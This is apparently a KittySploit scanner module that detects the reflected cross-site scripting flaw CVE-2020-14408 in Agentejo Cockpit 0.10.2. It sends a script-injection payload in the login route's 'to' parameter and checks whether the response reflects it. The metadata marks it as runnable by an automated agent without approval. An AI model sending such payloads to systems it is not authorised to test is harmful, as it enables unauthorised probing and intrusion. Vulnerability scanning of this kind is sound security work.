#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Agentejo Cockpit 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Agentejo Cockpit 0.10.2 - Cross-Site Scripting Detection',
        'description': "Agentejo Cockpit 0.10.2 contains a reflected cross-site scripting vulnerability due to insufficient sanitization of the to parameter in the /auth/login route, which allows for injection of arbitrary JavaScript code into a web page's content.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'cockpit', 'agentejo', 'xss', 'oss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/agentejo/cockpit/issues/1310',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-14408',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/StarCrossPortal/scalpel',
            'https://github.com/anonymous364872/Rapier_Tool',
        ],
        'cve': 'CVE-2020-14408',
    }

    def run(self):
        r = self.http_request(method="GET", path='/auth/login?to=/92874%27;alert(document.domain)//280', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("redirectTo = '/92874';alert(document.domain)//280';",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Agentejo Cockpit 0.10.2 - Cross-Site Scripting detected",
                path='/auth/login?to=/92874%27;alert(document.domain)//280',
            )
            return True
        return False

